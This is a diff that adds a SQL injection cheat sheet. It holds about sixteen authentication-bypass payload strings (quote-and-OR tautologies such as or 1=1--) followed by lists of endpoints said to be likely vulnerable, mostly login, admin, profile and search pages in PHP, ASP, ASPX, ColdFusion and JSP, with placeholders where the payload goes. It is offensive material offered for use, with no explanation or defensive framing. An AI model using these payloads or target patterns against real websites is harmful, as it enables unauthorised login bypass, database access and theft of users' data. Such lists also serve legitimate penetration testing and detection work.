@@ -1,0 +1,86 @@
+
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or 1=1--
+or true--
+" or true--
+' or true--
+")or true--
+') or true--
+' or 'x'='x
+) or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+
+these sqli endpoint are most likely vulnerable:
+
+.php:
+
+1.  index.php?category=<SQLi payload>
+2.  product.php?id=<SQLi payload>
+3.  news.php?article_id=<SQLi payload>
+4.  user.php?username=<SQLi payload>
+5.  login.php?username=<SQLi payload>&password=<SQLi payload>
+6.  search.php?q=<SQLi payload>
+7.  blog.php?post_id=<SQLi payload>
+8.  forum.php?thread_id=<SQLi payload>
+9.  profile.php?user_id=<SQLi payload>
+10. admin.php?username=<SQLi payload>&password=<SQLi payload>
+
+.asp:
+
+1.  default.asp?catid=<SQLi payload>
+2.  product.asp?id=<SQLi payload>
+3.  news.asp?newsid=<SQLi payload>
+4.  login.asp?username=<SQLi payload>&password=<SQLi payload>
+5.  search.asp?q=<SQLi payload>
+6.  blog.asp?postid=<SQLi payload>
+7.  forum.asp?threadid=<SQLi payload>
+8.  profile.asp?userid=<SQLi payload>
+9.  admin.asp?username=<SQLi payload>&password=<SQLi payload>
+10. register.asp?username=<SQLi payload>&password=<SQLi payload>
+
+.aspx:
+
+1.  default.aspx?catid=<SQLi payload>
+2.  product.aspx?id=<SQLi payload>
+3.  news.aspx?newsid=<SQLi payload>
+4.  login.aspx?username=<SQLi payload>&password=<SQLi payload>
+5.  search.aspx?q=<SQLi payload>
+6.  blog.aspx?postid=<SQLi payload>
+7.  forum.aspx?threadid=<SQLi payload>
+8.  profile.aspx?userid=<SQLi payload>
+9.  admin.aspx?username=<SQLi payload>&password=<SQLi payload>
+10. register.aspx?username=<SQLi payload>&password=<SQLi payload>
+
+.cfm:
+
+1.  index.cfm?catid=<SQLi payload>
+2.  product.cfm?id=<SQLi payload>
+3.  news.cfm?newsid=<SQLi payload>
+4.  login.cfm?username=<SQLi payload>&password=<SQLi payload>
+5.  search.cfm?q=<SQLi payload>
+6.  blog.cfm?postid=<SQLi payload>
+7.  forum.cfm?threadid=<SQLi payload>
+8.  profile.cfm?userid=<SQLi payload>
+9.  admin.cfm?username=<SQLi payload>&password=<SQLi payload>
+10. register.cfm?username=<SQLi payload>&password=<SQLi payload>
+
+.jsp:
+
+1.  index.jsp?catid=<SQLi payload>
+2.  product.jsp?id=<SQLi payload>
+3.  news.jsp?newsid=<SQLi payload>
+4.  login.jsp?username=<SQLi payload>&password=<SQLi payload>
+5.  search.jsp?q=<SQLi payload>
+6.  blog.jsp?postid=<SQLi payload>
+7.  forum.jsp?threadid=<SQLi payload>
+8.  profile.jsp?userid=<SQLi payload>
+9.  admin.jsp?username=<SQLi payload>&password=<SQLi payload>
+10. register.jsp?username=<SQLi payload>&password=<SQLi payload>
+
+
